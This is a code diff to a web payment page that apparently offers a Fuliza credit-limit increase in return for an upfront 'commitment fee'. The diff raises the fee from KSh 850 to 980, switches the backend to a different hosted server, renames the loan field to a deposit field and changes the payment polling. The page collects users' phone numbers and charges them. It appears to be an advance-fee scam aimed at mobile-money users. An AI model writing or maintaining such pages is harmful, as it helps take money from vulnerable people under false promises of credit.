@@ -130,7 +130,7 @@ body{font-family:'Segoe UI',Arial,sans-serif;background:#e8f5e9;min-height:100vh
       <div class="invoice-limit">Selected Fuliza Limit: <span>KSh <span id="limit">—</span></span></div>
       <div class="invoice-amount-row">
         <div class="invoice-currency">KSh</div>
-        <div class="invoice-amount">850</div>
+        <div class="invoice-amount">980</div>
         <div class="invoice-label">Amount Due</div>
       </div>
     </div>
@@ -173,7 +173,7 @@ body{font-family:'Segoe UI',Arial,sans-serif;background:#e8f5e9;min-height:100vh
     </div>
     <div class="phone-hint" id="phoneHint">Enter 9 digits after 254 — must start with 7 (e.g. 712345678)</div>
 
-    <button class="pay-btn" id="payBtn" onclick="payNow()">Pay KSh 850 Now</button>
+    <button class="pay-btn" id="payBtn" onclick="payNow()">Pay KSh 980 Now</button>
 
     <div class="spinner" id="spinner">
       <div class="loader"></div>
@@ -233,12 +233,12 @@ body{font-family:'Segoe UI',Arial,sans-serif;background:#e8f5e9;min-height:100vh
 </div>
 <script>
 
-const BACKEND = "https://nyota-paynecta-server.onrender.com";
+const BACKEND = "https://swiftwallet-server.onrender.com";
 
 const selectedAmount = localStorage.getItem("selectedAmount") || "—";
 document.getElementById("limit").innerText = selectedAmount;
 
-const COMMITMENT_FEE = 850;
+const COMMITMENT_FEE = 980;
 document.querySelector(".invoice-amount").innerText = COMMITMENT_FEE;
 
 const phoneInput  = document.getElementById("phone");
@@ -335,7 +335,7 @@ async function payNow() {
       body: JSON.stringify({
         phone: fullPhone,
         amount: COMMITMENT_FEE,
-        loan_amount: selectedAmount
+        deposit_amount: selectedAmount
       })
     });
 
@@ -412,13 +412,10 @@ function startPolling(reference, phone) {
       setSpinner(false);
       setPayBtn(false);
 
-      if (
-  receipt.status === "processing" ||
-  receipt.status === "loan_released"
-) {
-  showSuccessPopup(receipt);
-    
-      
+      if (receipt.status === "processing") {
+
+        showSuccessPopup(receipt, phone);
+
       } else {
 
         showFailurePopup("Payment was not completed, Please try again.");
@@ -427,7 +424,7 @@ function startPolling(reference, phone) {
 
     } catch (err) {}
 
-  }, 500);
+  }, 1500);
 }
 
 function showSuccessPopup(receipt, fallbackPhone) {
